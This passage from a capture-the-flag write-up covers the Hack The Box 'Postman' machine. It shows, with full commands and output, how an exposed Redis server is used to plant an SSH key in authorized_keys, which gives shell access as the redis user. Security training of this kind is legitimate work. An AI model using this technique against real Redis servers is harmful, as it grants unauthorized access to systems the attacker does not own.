[https://0xdf.gitlab.io/2019/01/26/htb-reddish.html](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html)
To interact with it, we can use the `redis-cli` tool and begin to gather information.
![[Pasted image 20260111200425.png]]
From this, we see that we are able to write arbitrary data and also note an interesting SSH directory. We can reason that we might be able to drop our key into this directory and then SSH as the redis user. Redis' creator and security researcher, antirez, [wrote a post about redis security](http://antirez.com/news/96) where he directly mentions this idea and has a simple proof of concept.

In order to get unauthorized SSH access via the redis instance, we have to create an SSH key and prepare it to be dumped into the database.

```bash
# ssh-keygen -t rsa -C "eelz@postman.htb"
...
# (echo -e "\\n\\n"; cat id_rsa.pub; echo -e "\\n\\n") > key.txt
# cat key.txt | redis-cli -h postman.htb -x set key
OK
# redis-cli -h postman.htb
postman.htb:6379> config set dir /var/lib/redis/.ssh
OK
postman.htb:6379> config set dbfilename "authorized_keys"
OK
postman.htb:6379> save
OK
```

Now that the key is appended to the authorized keys file, we can use our key to SSH in.

```bash
# ssh -i id_rsa redis@postman.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  <https://help.ubuntu.com>
 * Management:     <https://landscape.canonical.com>
 * Support:        <https://ubuntu.com/advantage>

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     <https://ubuntu.com/livepatch>
Failed to connect to <https://changelogs.ubuntu.com/meta-release-lts>. Check your Internet connection or proxy settings

Last login: Sun Mar 22 18:56:43 2020 from 10.10.15.142
redis@Postman:~$
```